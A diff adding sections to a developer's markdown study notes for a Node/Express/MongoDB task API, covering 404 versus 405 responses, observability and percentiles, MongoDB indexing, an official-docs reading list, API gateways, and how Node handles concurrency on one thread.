+**Why it must be the last `app.use` before the error handler:** it has no path, so it matches *everything*. It's only reached because nothing above it sent a response. Move it above the route mounts and it would 404 the entire API.
+
+---
+
+#### Q: A correct URL with the wrong method also returns 404 — shouldn't that be 405?
+
+**Yes, strictly.** `PUT /api/v1/tasks` gets a 404 today, even though that path exists and only the verb is wrong.
+
+It happens because Express matches **method and path together**. Walking its route list, `GET /tasks` fails on the method while the path matched fine — but Express doesn't record *why* each entry failed, only that nothing matched. That information is gone by the time the catch-all runs.
+
+| Code | Means |
+|------|-------|
+| **404** | Nothing exists at this address |
+| **405** | It exists, but not for that verb — must also send an `Allow` header |
+
+**To do it properly**, you declare the allowed methods per path:
+
+```js
+router.route('/')
+    .get(getTasks)
+    .post(createTask)
+    .all(methodNotAllowed(['GET', 'POST']));   // .all() must come last
+```
+
+**Verdict for this project: leave the 404.** The cost of 405 is a hand-written method list per route that nothing enforces — add a handler, forget the list, and the API lies. And a wrong method is a mistake made while *writing* client code, caught in seconds, never hit by real users. The Swagger spec already states the allowed methods for every path.
+
 **2. `middleware/auth.js` — `jwt.verify` got its own `try`.**
 
 Before, one `catch` wrapped both the token check *and* the database lookup:
@@ -2132,4 +2825,727 @@ Full detail for you, nothing for the attacker. In development the same response 
 **Every error now flows through one handler in `app.js`. `AppError` marks the ones whose message is safe to show — raised deliberately or converted by `normaliseError` — and everything else is treated as a bug: logged in full, answered with a bare 500.**
 
 See also: [`readme.md`](readme.md) error handling section, [§6](#6-global-error-handler--err-req-res-next) for the Express mechanics, [§13](#13-api-versioning--apiv1) on why this counts as breaking.
+
+---
+
+## 15. API performance & observability — the vocabulary and the loop
+
+**Status:** 💡 **Partial.** Logs + health are in `app.js`. Metrics, traces, error tracking, alerting, profiling are not.
+
+Logging **is** observability — it is one pillar, not the whole thing. The rest of this section is the map for what is still missing.
+
+---
+
+### Q: Is the right term "API metrics"?
+
+**Close, but narrower than the whole idea.** These words get used interchangeably and shouldn't be:
+
+| Term | What it actually means |
+|------|------------------------|
+| **Performance** | The **outcome** — how fast the API responds. Not a feature you add |
+| **Metrics** | One kind of telemetry: **numbers aggregated over time** — counters, gauges, histograms. Not only about speed (`signups_per_day` is a metric too) |
+| **Logs** | Individual **events**, one line each — your morgan output |
+| **Traces** | **One request's journey**, split into timed spans (route → auth → DB query) |
+| **Observability** | The umbrella discipline. Classically "three pillars": metrics + logs + traces |
+| **Monitoring** | The narrower practice: watch known metrics, **alert** when they cross a line |
+| **APM** | *Application Performance Monitoring* — the **product category**: Datadog APM, New Relic, Sentry Performance |
+| **Instrumentation** | The **act of adding code** that emits the telemetry |
+| **SLI** | The metric you chose to care about — "p95 latency on `GET /tasks`" |
+| **SLO** | The **target** you commit to — "under 300 ms, 99% of the time" |
+
+**Putting it together:** you *instrument* the API to emit *metrics*, in order to *monitor* its *performance* against an *SLO*.
+
+SLI/SLO is the step where performance stops being a feeling and becomes a number someone is accountable for.
+
+---
+
+### Q: Does logging fall under observability? What else?
+
+**Yes.** Observability is the umbrella: can you ask “what is this system doing, and why is this request slow / failing?” without attaching a debugger.
+
+The three **pillars** answer different questions:
+
+| Pillar | Question it answers | This project |
+|--------|---------------------|--------------|
+| **Logs** | What happened to *this* `PATCH /tasks/abc` at 11:40? | ✅ morgan access lines ([§12](#12-request-logging-morgan--health-check)) + `console.error` in the global handler |
+| **Metrics** | Is `GET /tasks` slower this week than last week? | ❌ no `/metrics`, no Prometheus. Only morgan’s duration on each line — that is a per-request number, not an aggregate |
+| **Traces** | Of those 800 ms, how many were auth vs the database? | ❌ not built |
+
+Morgan alone is **not** observability. It is the log pillar. A duration column is not a p95.
+
+What else sits under the same umbrella even if people don’t call them pillars:
+
+| Piece | Job | This project |
+|-------|-----|--------------|
+| **Health / readiness** | Is this instance fit to receive traffic? | ✅ `GET /health` — 200 / 503 from `mongoose.connection.readyState` |
+| **Error tracking** | Group crashes by stack + user, alert | 💡 `console.error` only. Sentry (or similar) is the product |
+| **Alerting** | Page a human when an SLI breaks | ❌ that is **monitoring** — it *uses* observability data |
+| **Profiling** | CPU, event-loop lag, heap snapshots | ❌ how you’d catch bcrypt blocking the loop ([§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads)) |
+| **Structured logs** | JSON with levels, searchable in a dashboard | ❌ still morgan text + `console.*`. `winston` / `pino` next |
+| **Uptime checks** | Probe `/health` from outside the server | ❌ Pingdom / UptimeRobot class — after deploy |
+
+A useful split:
+
+- **Observability** = emit enough signal that you can *investigate* something new.
+- **Monitoring** = watch a known number and *alert* when it crosses a line.
+
+**Implemented vs remaining (observability only):**
+
+| Done | Remains |
+|------|---------|
+| morgan → stdout (`dev` / `combined`) | `prom-client` + `GET /metrics` (p50 / p95 / p99 per route) |
+| `logs/access.log` in development | Distributed tracing (OpenTelemetry spans) |
+| `GET /health` | Sentry (or similar) instead of raw `console.error` |
+| Error handler hides 500 details in production, logs the rest | Alerting on error rate / latency |
+| | Structured JSON logs (`winston` / `pino`) |
+| | Event-loop lag / heap profiling |
+| | `app.set('trust proxy', 1)` so logged IPs are real, once anything sits in front |
+
+See [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring) for the same split next to the performance work (indexes, pagination) which is a different list.
+
+---
+
+### Q: Why percentiles instead of an average?
+
+**Because the average hides the users who are suffering.**
+
+```
+95 requests take 10 ms
+ 5 requests take 4000 ms
+─────────────────────────
+average = 209 ms   ← "looks fine"
+p95     = 4000 ms  ← 1 in 20 users is furious
+```
+
+| Metric | Reads as |
+|--------|----------|
+| **p50** (median) | The typical request |
+| **p95** | The bad-but-not-rare request — **the number teams actually watch** |
+| **p99** | The worst realistic case; where timeouts and lock contention show up |
+
+**Rule:** never report a single average latency. An average of a long-tailed distribution is close to meaningless.
+
+---
+
+### Q: How do large apps implement this?
+
+**The core loop — the discipline, not the tooling:**
+
+```
+measure  →  find the actual slow thing  →  fix it  →  watch the number move
+   ▲                                                          │
+   └──────────────────────────────────────────────────────────┘
+```
+
+Skipping the first step is the classic mistake: you optimise whatever you *guessed* was slow, which usually isn't the bottleneck.
+
+**In Node, concretely:** the `prom-client` library, a histogram labelled by route + method + status, updated in one middleware, exposed on a `GET /metrics` endpoint. Prometheus scrapes that endpoint on an interval; Grafana graphs it. Roughly 20 lines of app code.
+
+```
+your API  ──/metrics──▶  Prometheus  ──▶  Grafana dashboards
+ (emit)        (scrape)     (store)          (graph + alert)
+```
+
+Bigger shops **buy** this instead — an APM agent collects the same data plus distributed traces, so a single slow request can be opened up and read span by span.
+
+---
+
+### The layers large apps tune
+
+Roughly in the order they pay off:
+
+| Layer | Techniques | This project |
+|-------|------------|--------------|
+| **Measurement** | Metrics endpoint, APM, tracing, load tests | ❌ only morgan's timing column |
+| **Database** | Indexes, query plans (`.explain()`), projections, connection pooling | ❌ see below |
+| **Response shaping** | Pagination, `.select()`, `.lean()`, gzip compression | ❌ none |
+| **Caching** | HTTP `ETag` / `Cache-Control`, in-memory, Redis, CDN | ❌ none |
+| **Protection** | Rate limiting, request timeouts, circuit breakers | ✅ rate limiting only |
+| **Scale-out** | Node `cluster`, load balancer, HTTP keep-alive | ❌ not needed yet |
+
+---
+
+### Measured state of this API
+
+`Task.collection.indexes()` returns exactly one index:
+
+```js
+[ { v: 2, key: { _id: 1 }, name: '_id_' } ]
+```
+
+`.explain('executionStats')` on the `GET /tasks` query:
+
+```
+stage:      SORT          ← sorting in memory, not from an index
+returned:   14
+examined:   24 docs       ← read the whole collection
+index used: no
+```
+
+| Problem | Why it matters | Fix |
+|---------|----------------|-----|
+| **No index on `userId`** | Every list request scans the **entire** collection — including other users' tasks. Cost grows linearly with the collection | Compound index `{ userId: 1, createdAt: -1 }` — serves the filter **and** the sort |
+| **No pagination** | Response grows without bound; MongoDB's in-memory sort has a hard **32 MB** limit, so eventually it *errors*, not just slows | `?page` + `?limit` → `.skip()` / `.limit()` |
+| **`$regex` search** | Unanchored + `$options: 'i'` **cannot use a normal index**, ever — always a scan | MongoDB **text index** (different query syntax) or Atlas Search |
+| **Full documents returned** | List views rarely need `comments`, `subTasks`, `attachments` | `.select()` + `.lean()` for read-only responses |
+
+⚠️ At **24 documents** none of this is measurable. Seeing a real difference needs a few thousand seeded tasks first — which is also the honest reason to measure before optimising.
+
+---
+
+### Q: What's the right order to implement it here?
+
+Do the loop properly rather than adding the index blind:
+
+| Step | Why |
+|------|-----|
+| **1. Seed a few thousand tasks** | Throwaway script — without volume there's nothing to observe |
+| **2. `/metrics` with `prom-client`** | The instrumentation itself; p50/p95/p99 per route |
+| **3. Baseline load test** (`autocannon`) | Record p95 **before** touching anything |
+| **4. Add the compound index** | The single biggest win |
+| **5. Re-run the same load test** | A before/after number **you produced** — this is the part that teaches |
+| **6. Then pagination, `.lean()`, compression** | Each one measured the same way |
+
+**Note:** `/metrics` should sit **outside** `/api/v1` for the same reason as `/health` — it describes the server, not the API contract (see [§13](#13-api-versioning--apiv1)). It also shouldn't be publicly readable in production.
+
+---
+
+### One-line summary
+
+**Performance is the outcome; metrics are the numbers; logs are one pillar of observability, not the whole thing; APM is the product you buy instead. Watch p95, not averages — and measure before optimising, because this API's real bottleneck (a missing `{ userId, createdAt }` index causing a full collection scan) is invisible at 24 documents.**
+
+See also: [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring), [§12 request logging](#12-request-logging-morgan--health-check) for the timing data you already collect.
+
+---
+
+## 16. Queue — deeper topics not yet covered
+
+**Status:** ❌ none of these are implemented. This is the reading list, with what each one actually means and where it touches code that already exists. **16.6 and 16.7 have since been written up properly in [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**
+
+**Suggested order:** §16.7 first (the event loop underpins everything), then 16.5 and 16.6, then 16.1. The rest are independent.
+
+---
+
+### 16.1 Architecting unbreakable Node.js applications
+
+**Really about:** resilience — staying up when something outside your control fails. Graceful shutdown (catch `SIGTERM`, stop accepting connections, finish in-flight requests, close the Mongo connection, *then* exit), process-level safety nets (`unhandledRejection`, `uncaughtException`), timeouts on every outbound call, retries with backoff, circuit breakers, and idempotency keys so a client retry doesn't create the task twice.
+
+**Touches your code:** [§14](#14-centralized-error-handling--the-apperror-class) only catches errors that reach Express. A rejected promise **outside** a request — say in the `mongoose.connect` chain — bypasses it entirely. There's also no shutdown handler, so a deploy kills in-flight requests mid-write.
+
+---
+
+### 16.2 Hardening Node APIs against 2025 OWASP threats
+
+**Really about:** the **OWASP API Security Top 10**, which is a different list from the classic web Top 10. The headline item is **BOLA** (Broken Object Level Authorization) — reading someone else's record by changing an id in the URL. Then broken authentication, excessive data exposure, unrestricted resource consumption, mass assignment, and security misconfiguration.
+
+**Touches your code:** you've already built three of the defences without naming them — `{ _id, userId: req.user._id }` on every query is the BOLA fix, the field allowlist in `validateTaskBody` is the mass-assignment fix, and `.select('-password')` is the data-exposure fix. Two known gaps: the unescaped `$regex` (injection, see [§15](#15-api-performance--observability--the-vocabulary-and-the-loop)) and no request timeout.
+
+---
+
+### 16.3 How OAuth and OpenID Connect actually work
+
+**Really about:** two things people conflate. **OAuth 2.0** is *authorization* — letting another app act on a user's behalf without seeing their password. **OpenID Connect** is a thin layer on top that adds *authentication* — proving who the user is, via an `id_token`. Core concepts: the authorization-code flow with PKCE, the difference between access / refresh / ID tokens, scopes, and why the implicit flow is deprecated.
+
+**Touches your code:** what you built in `controllers/auth.js` is neither — it's first-party login issuing your own JWT. "Login with Google" replaces `bcrypt.compare` with a redirect dance and token verification against Google's public keys. Your `protect` middleware would change less than you'd expect.
+
+---
+
+### 16.4 Node.js caching from edge to Redis
+
+**Really about:** the layers, cheapest-and-farthest-out first. CDN / edge cache, then HTTP caching the browser honours (`ETag`, `Cache-Control`, `304 Not Modified`), then in-process memory, then Redis when several instances must share. The hard part is never the storing — it's **invalidation**, plus stampede protection when a hot key expires and a thousand requests all miss at once.
+
+**Touches your code:** Express already sends an `ETag` on `res.json()`, so conditional requests partly work today. A per-user cache on `GET /tasks` would need invalidating on every create, update and delete — which is exactly why caching is usually the *last* optimisation, after the index in [§15](#15-api-performance--observability--the-vocabulary-and-the-loop).
+
+---
+
+### 16.5 Surviving traffic spikes with backpressure
+
+**Really about:** what to do when work arrives faster than you can finish it. Without backpressure, Node accepts everything, memory climbs, event-loop lag grows, and *every* request gets slow — the queue becomes the outage. The fix is admission control: measure event-loop lag or queue depth, then **shed load** by returning `503` fast rather than accepting work you can't complete. For streams it's the `.pipe()` / `drain` mechanism that stops a fast producer overwhelming a slow consumer.
+
+**Touches your code:** rate limiting ([§11](#11-rate-limiting--what-it-is-strategies-what-we-use)) is a per-client **fairness** cap, not overload protection — 10,000 distinct IPs each stay under the limit and still sink the server. Different problem, different tool.
+
+---
+
+### 16.6 Scaling Node.js with threads, processes and clustering
+
+✅ **Now written up in full — see [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**
+
+**Really about:** one Node process runs your JavaScript on **one** core, so scaling means more processes: the built-in `cluster` module (or PM2) forking one worker per core behind a shared socket, and `worker_threads` for genuinely CPU-bound work that would otherwise block. Then the operational consequence — once there are several processes, anything held in local memory (rate-limit counters, caches, sessions) has to move to Redis.
+
+**Touches your code:** your rate limiter's in-memory store is per process, so with four workers a client effectively gets four times the limit — the exact reason [§11](#11-rate-limiting--what-it-is-strategies-what-we-use) flags Redis for multi-server deploys.
+
+---
+
+### 16.7 How Node.js handles single-threaded concurrency
+
+✅ **Now written up in full — see [§19](#19-how-node-serves-many-users--one-thread-cluster-worker-threads).**
+
+**Really about:** the foundation the three topics above stand on. One thread, one call stack, and an **event loop** with ordered phases (timers → pending → poll → check → close), plus microtasks (promises) draining between each. I/O isn't done by your thread — libuv hands sockets and files to the OS or to its own 4-thread pool, so thousands of connections are *concurrent* without being *parallel*. The corollary is the whole game: any synchronous CPU work blocks **every** other request.
+
+**Touches your code:** `bcrypt.hash` is deliberately expensive CPU work, so the `*Sync` variants would freeze the server for every registration — your `models/user.js` hook correctly `await`s the async API. One nuance corrected in [§19.5](#195-your-projects-one-real-cpu-cost-bcrypt): only the **native `bcrypt`** package moves that CPU to libuv's thread pool. You installed **`bcryptjs`**, which is pure JavaScript, so its async API merely *chunks* the work with `setImmediate` — the CPU is still spent on your event loop.
+
+---
+
+### One-line summary
+
+**Seven topics, one thread of logic: understand the event loop first, because backpressure, clustering and resilience are all consequences of Node running your code on a single thread — then OWASP, OAuth and caching are the API-level concerns layered on top.**
+
+---
+
+## 17. What to read in the official docs — Node, Express, MongoDB, Mongoose
+
+**Why bother when tutorials exist:** tutorials show one path that worked for someone else. Docs tell you the **options and the guarantees** — which is what you need the moment your case differs. They're also the only place version differences are stated, and you're on **Express 5** while most tutorials online are Express 4.
+
+**How to read them:** a *guide* page is prose meant to be read start to finish; a *reference* page is a lookup table you skim once to learn the shape, then return to. Read the guides, skim the references, never try to read a reference cover to cover.
+
+**Priority key:** 🔴 read now · 🟡 read soon · ⚪ when you need it
+
+---
+
+### 17.1 Node.js — [nodejs.org/api](https://nodejs.org/api/) + [nodejs.org/en/learn](https://nodejs.org/en/learn)
+
+The runtime everything else sits on. The guides matter more than the reference here.
+
+| Page | Why | Priority |
+|------|-----|----------|
+| **Learn → "The Node.js Event Loop, Timers, and process.nextTick()"** | The single most valuable page for a backend dev. Phases, microtasks, why order surprises you | 🔴 |
+| **Learn → "Don't Block the Event Loop"** | The practical consequence: one slow synchronous line stalls every request | 🔴 |
+| [`process`](https://nodejs.org/api/process.html) | `env`, exit codes, `SIGTERM`, `unhandledRejection` — the graceful-shutdown material from [§16.1](#161-architecting-unbreakable-nodejs-applications) | 🔴 |
+| [`path`](https://nodejs.org/api/path.html) | Why `__dirname` + `path.join` beats a bare `'public'` string (see `revision-1.md`) | 🔴 |
+| [`events`](https://nodejs.org/api/events.html) | `EventEmitter` is the pattern under streams, sockets and Mongoose connections | 🟡 |
+| [`stream`](https://nodejs.org/api/stream.html) | Where backpressure is actually defined ([§16.5](#165-surviving-traffic-spikes-with-backpressure)) | 🟡 |
+| [`fs`](https://nodejs.org/api/fs.html) | Read the **promises** API; note which calls have `Sync` twins and avoid them at runtime | 🟡 |
+| [`crypto`](https://nodejs.org/api/crypto.html) | `randomUUID`, timing-safe compare — relevant when you outgrow bcrypt-only auth | ⚪ |
+| [`cluster`](https://nodejs.org/api/cluster.html) + [`worker_threads`](https://nodejs.org/api/worker_threads.html) | [§16.6](#166-scaling-nodejs-with-threads-processes-and-clustering) | ⚪ |
+| [`http`](https://nodejs.org/api/http.html) | What Express wraps. Read it once so Express stops looking like magic | ⚪ |
+
+**Skip for now:** `vm`, `v8`, `async_hooks`, `domain` (deprecated), the C++ addon docs.
+
+---
+
+### 17.2 Express — [expressjs.com](https://expressjs.com/)
+
+Small library, small docs — genuinely readable in an afternoon.
+
+| Page | Why | Priority |
+|------|-----|----------|
+| [Migrating to Express 5](https://expressjs.com/en/guide/migrating-5.html) | **Start here.** You're *on* 5; most blog posts are 4. Explains real behaviour differences | 🔴 |
+| [Using middleware](https://expressjs.com/en/guide/using-middleware.html) | Mount order, path-scoped middleware — exactly how `helmet`, `morgan`, limiters and `/api-docs` are layered in your `app.js` | 🔴 |
+| [Error handling](https://expressjs.com/en/guide/error-handling.html) | The 4-argument rule and async behaviour behind [§14](#14-centralized-error-handling--the-apperror-class) | 🔴 |
+| [Routing](https://expressjs.com/en/guide/routing.html) | Route params, `Router()`, why `/bulk` must precede `/:id` | 🔴 |
+| [Writing middleware](https://expressjs.com/en/guide/writing-middleware.html) | You've already written three (`protect`, `validateObjectId`, the error handler) | 🟡 |
+| [Production best practices: performance](https://expressjs.com/en/advanced/best-practice-performance.html) | Compression, `NODE_ENV=production`, clustering, why not to use sync calls | 🟡 |
+| [Production best practices: security](https://expressjs.com/en/advanced/best-practice-security.html) | Helmet, cookies, rate limits, dependency audits — overlaps [§16.2](#162-hardening-node-apis-against-2025-owasp-threats) | 🟡 |
+| [API reference — `req` / `res` / `app`](https://expressjs.com/en/5x/api.html) | Skim to learn what exists (`res.set`, `req.ip`, `app.set('trust proxy')`), then use as lookup | 🟡 |
+
+> **One payoff you'd get immediately:** Express **5** forwards a rejected promise from an `async` handler to the error handler automatically — Express 4 did not, which is why every tutorial wraps handlers in `try/catch`. Your explicit `try { } catch (e) { next(e) }` is still fine and arguably clearer, but it's now a belt-and-braces choice rather than a requirement. That distinction only exists in the docs.
+
+---
+
+### 17.3 MongoDB — [mongodb.com/docs/manual](https://www.mongodb.com/docs/manual/)
+
+The database itself, independent of Mongoose. Read this when you care about *why a query is slow* or *how to shape data*.
+
+| Page | Why | Priority |
+|------|-----|----------|
+| [Indexes](https://www.mongodb.com/docs/manual/indexes/) | The fix for [§15](#15-api-performance--observability--the-vocabulary-and-the-loop). Single-field, compound, and the **ESR rule** (Equality → Sort → Range) for field order | 🔴 |
+| [Analyze query performance / explain results](https://www.mongodb.com/docs/manual/reference/explain-results/) | How to read `COLLSCAN` vs `IXSCAN`, `totalDocsExamined`, in-memory `SORT` | 🔴 |
+| [Query operators](https://www.mongodb.com/docs/manual/reference/operator/query/) | `$in`, `$or`, `$regex`, `$gte` — you use four of these already | 🔴 |
+| [Data model design](https://www.mongodb.com/docs/manual/core/data-model-design/) | Embed vs reference. Your `comments` / `subTasks` as string arrays is a decision this page names | 🟡 |
+| [Aggregation pipeline](https://www.mongodb.com/docs/manual/core/aggregation-pipeline/) | `$match`/`$group`/`$lookup` — needed for counts and stats endpoints | 🟡 |
+| [Text indexes](https://www.mongodb.com/docs/manual/core/indexes/index-types/index-text/) | The proper replacement for your `$regex` search | 🟡 |
+| [Transactions](https://www.mongodb.com/docs/manual/core/transactions/) | Multi-document atomicity — relevant if bulk create must be all-or-nothing at the DB level | ⚪ |
+| [TTL indexes](https://www.mongodb.com/docs/manual/core/index-ttl/) | Auto-expiring documents — sessions, tokens, old logs | ⚪ |
+| [Security checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/) | Before any deployment | ⚪ |
+
+**Skip for now:** sharding, replica-set administration, oplog internals.
+
+---
+
+### 17.4 Mongoose — [mongoosejs.com/docs](https://mongoosejs.com/docs/guide.html)
+
+The layer you actually call. The recurring theme: know which behaviour is **Mongoose's** and which is **MongoDB's**.
+
+| Page | Why | Priority |
+|------|-----|----------|
+| [FAQ](https://mongoosejs.com/docs/faq.html) | Short, and clears up the traps — including that **`unique: true` is an index, not a validator**, the exact thing `User.syncIndexes()` exists for in your `app.js` | 🔴 |
+| [Schemas](https://mongoosejs.com/docs/guide.html) | Options like `timestamps`, `strict`, and `schema.index()` — where your task indexes will go | 🔴 |
+| [Validation](https://mongoosejs.com/docs/validation.html) | Built-in vs custom validators, and why `findOneAndUpdate` needs `runValidators: true` (your `updateTask` sets it) | 🔴 |
+| [Queries](https://mongoosejs.com/docs/queries.html) | Query objects aren't promises until awaited; chaining `.sort()`, `.select()`, `.limit()` | 🔴 |
+| [Middleware](https://mongoosejs.com/docs/middleware.html) | `pre('save')` for password hashing, and the important gap: **document** hooks don't run on `findOneAndUpdate` | 🟡 |
+| [Lean](https://mongoosejs.com/docs/tutorials/lean.html) | The read-path performance win from [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) | 🟡 |
+| [Populate](https://mongoosejs.com/docs/populate.html) | Following `ref: 'User'` — and the N+1 query trap it hides | 🟡 |
+| [SchemaTypes](https://mongoosejs.com/docs/schematypes.html) | Casting rules, `ObjectId`, why a bad id throws `CastError` (which `normaliseError` maps to 400) | 🟡 |
+| [Transactions](https://mongoosejs.com/docs/transactions.html) | Sessions, once you need multi-document atomicity | ⚪ |
+| [TypeScript](https://mongoosejs.com/docs/typescript.html) | When you move the project to TS | ⚪ |
+
+---
+
+### A reading order that builds on itself
+
+| # | Read | Then you can |
+|---|------|--------------|
+| 1 | Express **Migrating to 5** + **Error handling** | Understand your own `app.js` completely |
+| 2 | Node **Event Loop** + **Don't Block the Event Loop** | Reason about what "slow" even means here |
+| 3 | Mongoose **FAQ** + **Schemas** | Stop being surprised by `unique` and hooks |
+| 4 | MongoDB **Indexes** + **explain results** | Actually fix [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) instead of guessing |
+| 5 | Express **production best practices** (both) | Know what's missing before deploying |
+
+---
+
+### One-line summary
+
+**Read the guides and skim the references: Express's Migrating-to-5 and error-handling pages explain your own `app.js`, Node's event-loop guide defines what "slow" means, Mongoose's FAQ dispels the `unique`-is-not-a-validator trap you already hit, and MongoDB's Indexes plus explain-results pages are what turn [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) from theory into a measured fix.**
+
+---
+
+## 18. What is an API gateway?
+
+**Status:** ❌ not used in this project — and [correctly so](#q-do-you-need-one-here) for now.
+
+---
+
+### The one-line version
+
+**A single front door that all API traffic passes through before reaching your actual service** — a reverse proxy that also handles the concerns every API needs, so individual services don't have to.
+
+---
+
+### What it typically handles
+
+| Concern | Examples |
+|---------|----------|
+| **Routing** | Send `/tasks/*` to one service, `/billing/*` to another |
+| **TLS termination** | HTTPS ends at the gateway; internal hops can be plain HTTP |
+| **Authentication** | Validate the JWT / API key once, at the edge |
+| **Rate limiting & quotas** | Per client, per plan, per route |
+| **Request hygiene** | Size limits, CORS, header stripping |
+| **Caching** | Serve repeat reads without touching the service |
+| **Observability** | One place that sees every request — logs, metrics, tracing headers |
+| **Traffic shaping** | Canary releases, blue/green, version splitting |
+
+⚠️ Read that list against your `app.js` and notice: **you have already built five of these inside the application** — Helmet's headers, CORS, the two rate limiters, the `/api/v1` prefix, and JWT verification in `protect`.
+
+---
+
+### The problem it actually solves
+
+One service, in-app is fine. The pain starts at **ten** services.
+
+Without a gateway, every service reimplements rate limiting, every service parses tokens, every service configures CORS — ten copies of the same logic, drifting apart, each with its own bugs. A gateway pulls those **cross-cutting concerns** into one layer that all services sit behind.
+
+```
+                     ┌────────────────┐
+   clients  ───────▶  │  API Gateway   │ ──▶  tasks service
+                     │                │ ──▶  users service
+                     │  TLS, auth,    │ ──▶  billing service
+                     │  rate limit,   │
+                     │  routing       │
+                     └────────────────┘
+```
+
+| Tool | Notes |
+|------|-------|
+| **AWS API Gateway** | Managed; pairs with Lambda or ECS |
+| **Kong**, **Apigee**, **Azure API Management** | Full API-management platforms — keys, plans, developer portals |
+| **Envoy**, **Traefik** | The Kubernetes / service-mesh world |
+| **nginx** | Does the proxy + TLS part well, without API-specific features |
+
+**Related pattern — BFF (Backend For Frontend):** a thin per-client gateway (one for web, one for mobile) that aggregates several services into the exact shape that client needs.
+
+---
+
+### Q: Do you need one here?
+
+**No.** One service, one process. A gateway would add a component to deploy, operate and debug while replacing logic that already works.
+
+When you deploy, the platform (Render, Railway, a cloud load balancer) already gives you TLS and routing — which is the part you'd actually miss.
+
+**The honest test for later:** you want a gateway when you have **more than one service** and are copy-pasting cross-cutting middleware between them.
+
+---
+
+### ⚠️ Two things to know for when you do
+
+#### 1. `req.ip` stops being the client
+
+Anything proxying in front of your app makes `req.ip` the **proxy's** address:
+
+```js
+app.set('trust proxy', 1);   // read the real client IP from X-Forwarded-For
+```
+
+Without it your per-IP rate limiter buckets **the entire internet together** ([§11](#11-rate-limiting--what-it-is-strategies-what-we-use)) and every morgan log line records the same IP forever ([§12](#12-request-logging-morgan--health-check)). Mandatory the moment anything sits in front.
+
+#### 2. Don't blindly trust gateway headers
+
+If the gateway validates the JWT and forwards `X-User-Id`, it's tempting to delete `protect` and read the header. Only safe if the network **genuinely** prevents anyone reaching the service directly — otherwise anyone who can hit your service can set that header and become anyone.
+
+Most teams keep verification in the service too, because that network assumption tends to break quietly. That's the "defence in depth" / zero-trust argument.
+
+---
+
+### One-line summary
+
+**An API gateway is one front door doing the work every service would otherwise duplicate — routing, TLS, auth, rate limiting, caching. You've built five of those into `app.js`, which is right for a single service; a gateway earns its keep when there are several. Whenever one appears in front, `app.set('trust proxy', 1)` becomes mandatory or per-IP rate limiting and IP logging both silently break.**
+
+See also: [§11 rate limiting](#11-rate-limiting--what-it-is-strategies-what-we-use), [§13 API versioning](#13-api-versioning--apiv1), [§16.4 caching from edge to Redis](#164-nodejs-caching-from-edge-to-redis).
+
+---
+
+## 19. How Node serves many users — one thread, cluster, worker threads
+
+**Status:** 💡 your app runs as **one process on one core** today. Nothing here is implemented — but one thing in `app.js` will break the day you cluster it, and it is called out below.
+
+**The question this answers:** if Node is single-threaded, how does it serve hundreds of users at once — and what do `cluster` and `worker_threads` actually add?
+
+---
+
+### 19.1 First, the surprise: one thread is already enough
+
+Look at what `GET /api/v1/tasks` really spends its time on:
+
+| Step | Who does it | Time |
+|------|-------------|------|
+| parse the request, run `protect`, build the filter | **your thread** | ~0.2 ms |
+| `await Task.find(filter)` | **MongoDB**, over the network | ~15 ms |
+| turn the result into JSON, send it | **your thread** | ~0.3 ms |
+
+Your JavaScript is busy for about **0.5 ms** out of a **16 ms** request. The other 15.5 ms it is doing nothing at all — it is *waiting*.
+
+Node's whole design is: **never sit and wait.** When you `await` the database, Node hands the socket to the operating system, remembers "when this answers, run the rest of `getTasks`", and immediately picks up the next request.
+
+---
+
+### 19.2 See it with three users at once
+
+Three requests arrive at the same millisecond. One thread, and yet:
+
+```text
+ms 0    ──▶ req A: run 0.2ms of JS, send query to Mongo, park it
+ms 0.2  ──▶ req B: run 0.2ms of JS, send query to Mongo, park it
+ms 0.4  ──▶ req C: run 0.2ms of JS, send query to Mongo, park it
+ms 0.6      thread is now IDLE — three queries are in flight
+ms 15   ──▶ Mongo answers A → run 0.3ms → response sent
+ms 15.4 ──▶ Mongo answers B → run 0.3ms → response sent
+ms 15.9 ──▶ Mongo answers C → run 0.3ms → response sent
+```
+
+All three finished in ~16 ms, not 48 ms. The thread was busy for 1.5 ms total.
+
+Multiply it out: at 0.5 ms of JS per request, one thread can retire roughly **2,000 requests per second** before the CPU is even the problem. Your database will complain long before Node does.
+
+> **The two words that matter**
+>
+> - **Concurrent** = many requests *in progress* at once. Node does this brilliantly with one thread.
+> - **Parallel** = many requests *executing JavaScript* at the same instant. One Node process never does this.
+>
+> For an API that mostly waits on a database, concurrency is what you needed anyway.
+
+---
+
+### 19.3 Who does the waiting, if not your thread
+
+```text
+        ┌──────────────────────────────────────┐
+        │  YOUR JAVASCRIPT — one thread only   │
+        │  controllers, validation, res.json   │
+        └──────────────────────────────────────┘
+                    ▲              │
+      "this is done, run          │ "go do this, tell me later"
+       your callback"             ▼
+        ┌──────────────────────────────────────┐
+        │  libuv + the operating system        │
+        │  sockets, DNS, files, timers         │
+        │  + a 4-thread pool for fs / crypto   │
+        └──────────────────────────────────────┘
+```
+
+Network I/O costs your thread nothing — the OS notifies Node when data arrives. Some things (file reads, `crypto`, DNS lookups) use libuv's small thread pool, which defaults to **4 threads**. Either way, the work happens **off** your thread, and your callback is queued for when it finishes.
+
+---
+
+### 19.4 The one rule, and the one way to break it
+
+**Your JavaScript runs one function at a time, start to finish, with no interruptions.** Nothing else can run until it returns.
+
+So a slow *awaited* call is harmless, and a slow *synchronous* call is a site-wide outage:
+
+```js
+// HARMLESS — 15ms of waiting, thread free the whole time
+const tasks = await Task.find(filter);
+
+// TOXIC — 200ms of CPU. Nobody else's request moves for 200ms.
+let total = 0;
+for (let i = 0; i < 2_000_000_000; i++) total += i;
+```
+
+What that costs, with 50 users online:
+
+| | awaited 200 ms | synchronous 200 ms |
+|---|---|---|
+| the user who caused it | 200 ms | 200 ms |
+| the 49 others | unaffected | **+200 ms each**, queued behind it |
+| server CPU | idle | pinned |
+
+This is the entire reason "don't block the event loop" is the first rule of Node. It is also why the symptom is so recognisable: in your morgan log, **every** response time inflates at once, not just one route.
+
+**The usual culprits:** `JSON.parse` on a huge payload, `fs.readFileSync`, a catastrophic regex, sorting a hundred thousand documents in JS instead of in mongo, and password hashing.
+
+---
+
